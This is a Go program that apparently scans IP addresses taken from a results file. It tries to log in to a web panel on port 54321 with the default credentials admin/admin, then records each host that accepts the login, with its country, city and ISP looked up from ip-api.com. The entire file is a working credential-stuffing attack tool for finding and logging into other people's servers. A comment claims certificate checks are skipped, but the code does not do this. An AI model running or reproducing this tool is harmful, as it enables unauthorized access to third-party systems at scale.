package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

type IPInfo struct {
	Country string `json:"country"`
	Region  string `json:"regionName"`
	City    string `json:"city"`
	ISP     string `json:"isp"`
}

type ResponseData struct {
	Success bool `json:"success"`
}

func getIPInfo(ip string) (string, error) {
	url := fmt.Sprintf("http://ip-api.com/json/%s?fields=country,regionName,city,isp", ip)
	client := http.Client{
		Timeout: 2 * time.Second,
	}
	response, err := client.Get(url)
	if err != nil {
		return "", err
	}
	defer response.Body.Close()

	if response.StatusCode == http.StatusOK {
		ipInfo := IPInfo{}
		err := json.NewDecoder(response.Body).Decode(&ipInfo)
		if err != nil {
			return "", err
		}
		return fmt.Sprintf("%s, %s, %s, ISP: %s", ipInfo.Country, ipInfo.Region, ipInfo.City, ipInfo.ISP), nil
	}

	return "N/A", nil
}

func main() {
	data := url.Values{
		"username": {"admin"},
		"password": {"admin"},
	}

	file, err := os.Open("results.txt")
	if err != nil {
		fmt.Println("Failed to open file:", err)
		return
	}
	defer file.Close()

	resultFile, err := os.OpenFile("result.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Failed to open result file:", err)
		return
	}
	defer resultFile.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()

		// 提取IP地址
		parts := strings.Split(line, "Host: ")
		if len(parts) < 2 {
			fmt.Println("Invalid line format:", line)
			continue
		}
		ip := strings.Split(parts[1], " ")[0]
		url := "http://" + ip + ":54321/login"

		// 尝试使用 HTTP 进行请求
		client := http.Client{
			Timeout: 2 * time.Second,
		}
		response, err := client.PostForm(url, data)
		if err != nil {
			// 使用 HTTPS 进行请求，跳过证书验证
			url = "https://" + ip + ":54321/login"
			response, err = client.PostForm(url, data)
			if err != nil {
				fmt.Println(ip + " Def")
				continue
			}
		}
		defer response.Body.Close()

		if response.StatusCode == http.StatusOK {
			responseData := ResponseData{}
			err := json.NewDecoder(response.Body).Decode(&responseData)
			if err != nil {
				fmt.Println("Invalid JSON response from:", url)
				continue
			}

			if responseData.Success {
				ipInfo, err := getIPInfo(ip)
				if err != nil {
					fmt.Println("Failed to get IP info for", ip)
					continue
				}

				fmt.Println(ip + " Successful (" + ipInfo + ")")
				resultFile.WriteString(ip + " (" + ipInfo + ")\n")
			} else {
				fmt.Println(ip + " Def")
			}
		} else {
			fmt.Println(ip + " Def")
		}
	}

	if err := scanner.Err(); err != nil {
		fmt.Println("Error reading file:", err)
	}
}
